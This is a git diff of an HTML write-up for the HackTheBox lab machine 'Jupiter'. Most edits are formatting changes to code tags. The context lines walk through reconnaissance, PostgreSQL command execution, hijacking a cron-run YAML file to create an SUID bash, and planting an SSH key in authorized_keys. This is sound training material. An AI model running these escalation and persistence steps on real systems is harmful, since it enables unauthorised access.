@@ -39,15 +39,15 @@
 <h3><br/>About Jupiter</h3><br/>
 Jupiter is a medium-difficulty machine on the HackTheBox platform. To start, we encounter a web service running Grafana in the background. Upon loading the main page, we notice POST requests being made to an endpoint that enables interaction with a database.<br/><br/>
 <h3><br>Shell as postgres</br></h3><br>
-Because we can control the content of the POST request, we exploit a 'malicious' query to execute system-level commands and gain access with a reverse shell.<br/><br/>
+Because we can control the content of the POST request, we exploit a <code>malicious</code> query to execute system-level commands and gain access with a reverse shell.<br/><br/>
 <h3><br>Shell as juno</br></h3><br>
-When listing tasks running at regular intervals, we observe that the user 'juno' is executing a program with a file as an argument, a file which we, as Postgres, can modify. Modifying this file allows us to execute commands as 'juno'. After copying '/bin/bash' to the '/tmp' directory and assigning it SUID privileges, we abuse the '-p' parameter to inherit the privileges and execute commands with 'juno's EUID. Ultimately, by exploiting SSH keys, we gain full access as the 'juno' user.<br/><br/>
+When listing tasks running at regular intervals, we observe that the user <code>juno</code> is executing a program with a file as an argument, a file which we, as Postgres, can modify. Modifying this file allows us to execute commands as <code>juno</code>. After copying <code>/bin/bash</code> to the <code>/tmp</code> directory and assigning it SUID privileges, we abuse the <code>-p</code> parameter to inherit the privileges and execute commands with juno's EUID. Ultimately, by exploiting SSH keys, we gain full access as the <code>juno</code> user.<br/><br/>
 <h3><br>Shell as jovian</br></h3><br>
-As a user 'Juno,' we belong to the 'science' group. While listing processes running under the 'Jovian' user, we notice the presence of 'jupyter-notebook.' By checking the open ports, we find port '8888.' This port is associated with an HTTP server running 'jupyter-notebook' in the background. After examining some logs, we manage to access the service and create our own notebook to execute Python code and gain access to the system via a reverse shell.<br/><br/>
+As a user <code>Juno</code>, we belong to the <code>science</code> group. While listing processes running under the <code>Jovian</code> user, we notice the presence of <code>jupyter-notebook</code>. By checking the open ports, we find port <code>8888</code>. This port is associated with an HTTP server running <code>jupyter-notebook</code> in the background. After examining some logs, we manage to access the service and create our own notebook to execute Python code and gain access to the system via a reverse shell.<br/><br/>
 <h3><br>Shell as root</br></h3><br>
-The user 'Jovian' has sudoer privileges to run a program as root. This program opens a file that we can modify, allowing us to abuse our sudoer privileges to read and write system files as the 'root' user, ultimately gaining access to the 'root' user.<br/><br/>
+The user <code>Jovian</code> has sudoer privileges to run a program as root. This program opens a file that we can modify, allowing us to abuse our sudoer privileges to read and write system files as the <code>root</code> user, ultimately gaining access to the <code>root</code> user.<br/><br/>
 <h3><br>Recon</br></h3><br>
-First, we will run a port scan to discover open ports on the victim machine using the 'nmap' tool:<br/><br/>
+First, we will run a port scan to discover open ports on the victim machine using the <code>nmap</code> tool:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.216</span>
@@ -59,7 +59,7 @@ First, we will run a port scan to discover open ports on the victim machine usin
 </pre></div>
 
 Once the initial scan is complete, we will proceed with a second scan to identify the technologies and services running on the ports we've previously discovered. <br/><br/>
-Again, we will utilize the 'nmap' tool:<br/><br/>
+Again, we will utilize the <code>nmap</code> tool:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.216</span> <span class="p">(</span><span class="mf">10.10.11.216</span><span class="p">)</span>
@@ -81,7 +81,7 @@ Again, we will utilize the 'nmap' tool:<br/><br/>
 
 Thanks to this scan, we now have information about the services running on these ports.<br/><br/>
 <h3><br>Web Application</br></h3><br>
-Since we can't access 'jupiter.htb,' we need to add it to our <code>/etc/hosts</code> file to resolve the domain to the victim's IP address.<br/><br/>
+Since we can't access <code>jupiter.htb</code> we need to add it to our <code>/etc/hosts</code> file to resolve the domain to the victim's IP address.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
@@ -140,7 +140,7 @@ Using tools like <a href="https://github.com/ffuf/ffuf">ffuf</a> or <a href="htt
 <span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
 </pre></div>
 
-All the responses are consistently returning '178' characters, so I'm going to filter out that result.<br/><br/>
+All the responses are consistently returning <code>178</code> characters, so I'm going to filter out that result.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fs</span><span class="o">=</span><span class="mi">178</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.jupiter.htb"</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
@@ -169,7 +169,7 @@ All the responses are consistently returning '178' characters, so I'm going to f
 <span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">575</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
 </pre></div>
 
-We've discovered the 'kiosk' subdomain. Now, let's add this subdomain to our <code>/etc/hosts</code> file:<br/><br/>
+We've discovered the <code>kiosk</code> subdomain. Now, let's add this subdomain to our <code>/etc/hosts</code> file:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
@@ -183,7 +183,7 @@ We've discovered the 'kiosk' subdomain. Now, let's add this subdomain to our <co
 <span class="mf">10.10.11.216</span> <span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span> <span class="n">kiosk</span><span class="o">.</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span>
 </pre></div>
 
-Now, if we attempt to access 'kiosk.jupiter.htb,' we encounter the following:<br/><br/>
+Now, if we attempt to access <code>kiosk.jupiter.htb</code>, we encounter the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/2.png"/><br/><br/>
 Grafana is running behind the scenes. For those who may not be familiar with Grafana, it's an open-source platform used for real-time data visualization and monitoring. It enables the creation of interactive dashboards and graphs using data from various sources, including databases, cloud services, monitoring systems, and more. Grafana is extensively utilized in the realms of system administration and application monitoring to visualize data and performance metrics in a user-friendly and customizable manner.<br/><br/>
 Although we ran a <a href="https://addons.mozilla.org/es/firefox/addon/wappalyzer/">Wappalyzer</a> scan, it did not provide information about the specific version of Grafana in use, thus yielding no useful information.<br/><br/>
@@ -203,7 +203,7 @@ It's running PostgreSQL version 14.8. Now, let's verify if the user can execute 
 <div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolname</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolsuper</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolinherit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreaterole</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreatedb</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcanlogin</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolconnlimit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolvaliduntil</span><span class="p">,</span><span class="w"> </span><span class="nb">ARRAY</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">rolname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_auth_members</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">roleid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">member</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">memberof</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolreplication</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </pre></div>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/8.png"/><br/><br/>
-Upon examining the response, we ascertain that we have the ability to execute commands, as we possess the 'pg_execute_server_program' privilege.<br/><br/>
+Upon examining the response, we ascertain that we have the ability to execute commands, as we possess the <code>pg_execute_server_program</code> privilege.<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/9.png"/><br/><br/>
 In order to execute commands, we need to begin by creating a table:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
@@ -319,7 +319,7 @@ After uploading pspy to the victim machine, let's run it:<br/><br/>
 
 After a short wait, I came across this:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/14.png"/><br/><br/>
-Juno is running a binary that I can't access, and it is including a file in the <code>/dev/shm</code> directory. Upon examining 'network-simulation.yml,' it's evident that commands specified in this file are being executed.<br/><br/>
+Juno is running a binary that I can't access, and it is including a file in the <code>/dev/shm</code> directory. Upon examining <code>network-simulation.yml</code>, it's evident that commands specified in this file are being executed.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
 <span class="n">general</span><span class="p">:</span>
   <span class="c1"># stop after 10 simulated seconds</span>
@@ -354,7 +354,7 @@ Juno is running a binary that I can't access, and it is including a file in the 
 <span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
-It's creating an HTTP server and making a curl request to <code>server</code>. Since I can modify this file, let's execute something as 'Juno':<br/><br/>
+It's creating an HTTP server and making a curl request to <code>server</code>. Since I can modify this file, let's execute something as <code>Juno</code>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
 <span class="n">general</span><span class="p">:</span>
   <span class="c1"># stop after 10 simulated seconds</span>
@@ -389,7 +389,7 @@ It's creating an HTTP server and making a curl request to <code>server</code>. S
 <span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
-I modified the file and changed the command to execute <code>/usr/bin/touch</code> in order to create a file named 'pwned' in the <code>/tmp</code> directory. Assuming it runs as 'Juno,' the owner of the file should be 'Juno.' After a minute, the 'pwned' file was indeed created by 'Juno':<br/><br/>
+I modified the file and changed the command to execute <code>/usr/bin/touch</code> in order to create a file named <code>pwned</code> in the <code>/tmp</code> directory. Assuming it runs as <code>Juno</code>, the owner of the file should be <code>Juno</code>. After a minute, the <code>pwned</code> file was indeed created by <code>Juno</code>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
 <span class="n">total</span> <span class="mi">28</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">juno</span> <span class="n">juno</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">48</span> <span class="n">pwned</span>
@@ -403,8 +403,8 @@ I modified the file and changed the command to execute <code>/usr/bin/touch</cod
 <span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
-To escalate to 'Juno,' I'll copy <code>/bin/bash</code> to <code>/tmp/bash</code> and set it with SUID privileges. Then, I will execute <code>/tmp/bash -p</code> to inherit its privileges.<br/><br/>
-I will add the following content to 'network-simulation.yml':<br/><br/>
+To escalate to <code>Juno'</code> I'll copy <code>/bin/bash</code> to <code>/tmp/bash</code> and set it with SUID privileges. Then, I will execute <code>/tmp/bash -p</code> to inherit its privileges.<br/><br/>
+I will add the following content to <code>network-simulation.yml</code>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
 <span class="n">general</span><span class="p">:</span>
   <span class="c1"># stop after 10 simulated seconds</span>
@@ -439,27 +439,27 @@ I will add the following content to 'network-simulation.yml':<br/><br/>
 <span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
-As you can see, it will first copy <code>/bin/bash</code> to <code>/tmp/bash</code>, and then it will grant '4755' privilege (Set-UID) to <code>/tmp/bash</code>. With the 'Set-UID' flag set on <code>/tmp/bash</code>, I will be able to execute commands as 'Juno' by exploiting the '-p' parameter.<br/><br/>
+As you can see, it will first copy <code>/bin/bash</code> to <code>/tmp/bash</code>, and then it will grant <code>4755</code> privilege (Set-UID) to <code>/tmp/bash</code>. With the <code>Set-UID</code> flag set on <code>/tmp/bash</code>, I will be able to execute commands as <code>Juno</code> by exploiting the <code>-p</code> parameter.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">juno</span> <span class="n">juno</span> <span class="mi">1396520</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">13</span><span class="p">:</span><span class="mi">06</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span>
 <span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
-It has been successfully copied and set with Set-UID. Now, let's execute it with the '-p' parameter:<br/><br/>
+It has been successfully copied and set with Set-UID. Now, let's execute it with the <code>-p</code> parameter:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">whoami</span>
 <span class="n">juno</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
 </pre></div>
 
-We are now executing commands as 'Juno.'<br/><br/>
-However, if we attempt to read 'user.txt,' it indicates that we don't have access:<br/><br/>
+We are now executing commands as <code>Juno</code>.<br/><br/>
+However, if we attempt to read <code>user.txt</code>, it indicates that we don't have access:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">cat</span><span class="p">:</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
 </pre></div>
 
-This is because we are executing commands with 'Juno's' EUID, and the 'user.txt' flag is only accessible to the owner and the 'Juno' group:<br/><br/>
+This is because we are executing commands with Juno's EUID, and the <code>user.txt</code> flag is only accessible to the owner and the <code>Juno</code> group:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> 
 <span class="n">total</span> <span class="mi">12</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">12</span> <span class="n">juno</span> <span class="n">juno</span> <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2023</span> <span class="n">shadow</span>
@@ -468,18 +468,18 @@ This is because we are executing commands with 'Juno's' EUID, and the 'user.txt'
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
 </pre></div>
 
-At this stage, we aren't truly 'Juno'; we're merely executing commands with 'Juno's' EUID, which is why we inherit some of its privileges.<br/><br/>
+At this stage, we aren't truly <code>Juno</code>; we're merely executing commands with Juno's EUID, which is why we inherit some of its privileges.<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">114</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">120</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">120</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">119</span><span class="p">(</span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
 </pre></div>
 
-Our next step is to attempt to gain access as 'Juno.' There are various techniques to achieve this, and in my case, I will work with SSH keys. I will copy the public key from my attacker's machine to the <code>/home/juno/authorized_keys</code> file. Once this is done, we can access the SSH service as the 'Juno' user without the need to provide a password<br/><br/>
+Our next step is to attempt to gain access as <code>Juno</code>. There are various techniques to achieve this, and in my case, I will work with SSH keys. I will copy the public key from my attacker's machine to the <code>/home/juno/authorized_keys</code> file. Once this is done, we can access the SSH service as the <code>Juno</code> user without the need to provide a password<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMzYWcHjgBMlcgqOv9UTofEDod6OdJZkH4UR6d/U5nzupmuCpg2a59S+JggOPXomVzNfNeGs2Q0iYKnAYj7AiwFubzyKxBvgImoI6v6C8J7tJVBOMhBW2Hzy53fXw4gn5jjxl4wJ6hAZtCIhkgQNImLhkQYictkBLGZkl7k73sU1rzLNsePfqk9nxbJ7jWYG5G9n+HfDCpUi8MHj7Mty55ETIsGwU9Nq16wd4wenHPRYSSQhRC7YMsvuSYYO/teoCc9JjUNu0GfpeLW5kU6ZP/62IF2869EiLKLU1wVqVIN2hxizwqVl8q8zF8U/lBR6WoP+mXzC9KxnA8LJcz0zCfXdscVO8pHkNT0iyDk+za4EIoDWVbDcClcYBqpLEg/eqgZOOPLopm/aXY4TBtdP348NM8qMl/9uBAqFya4SAcBsR98x5j7KWGqXkS8eTZ/nlK7k+gwWSoajS4UHYpNDtx+QUcR6MExMYXN0SgJOXf0UZFLR4RFXj69PKh9gcYch0= @elswix@kali'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">juno</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="err">$</span>
 </pre></div>
 
-Now, if we attempt to connect to the victim machine as the 'Juno' user via SSH:<br/><br/>
+Now, if we attempt to connect to the victim machine as the <code>Juno</code> user via SSH:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">juno</span><span class="o">@</span><span class="mf">10.10.11.216</span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
@@ -514,7 +514,7 @@ Now, if we attempt to connect to the victim machine as the 'Juno' user via SSH:<
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
-We have successfully gained access to the system as 'Juno.' Running the 'id' command confirms that we now possess all of 'Juno's' privileges.<br/><br/>
+We have successfully gained access to the system as <code>Juno</code>. Running the <code>id</code> command confirms that we now possess all of Juno's privileges.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">juno</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">science</span><span class="p">)</span>
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
@@ -526,7 +526,7 @@ At this point, we can read the first flag:<br/><br/>
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as jovian</br></h3><br>
-As 'Juno,' we are part of the 'science' group, which is an uncommon group. Let's list the files owned by the 'science' group:<br/><br/>
+As <code>Juno</code>, we are part of the <code>science</code> group, which is an uncommon group. Let's list the files owned by the <code>science</code> group:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">science</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">csv</span>
@@ -550,7 +550,7 @@ As 'Juno,' we are part of the 'science' group, which is an uncommon group. Let's
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
-Upon examining the 'solar-flares' directory, we notice that all these files are also owned by the 'Jovian' user:<br/><br/>
+Upon examining the <code>solar-flares</code> directory, we notice that all these files are also owned by the <code>Jovian</code> user:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">2608</span>
 <span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">4</span> <span class="n">jovian</span> <span class="n">science</span>    <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">59</span> <span class="o">.</span>
@@ -568,14 +568,14 @@ Upon examining the 'solar-flares' directory, we notice that all these files are 
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-After inspecting the processes running under the 'Jovian' user, I came across the following:<br/><br/>
+After inspecting the processes running under the <code>Jovian</code> user, I came across the following:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">auxw</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">jovian</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="n">juno</span>
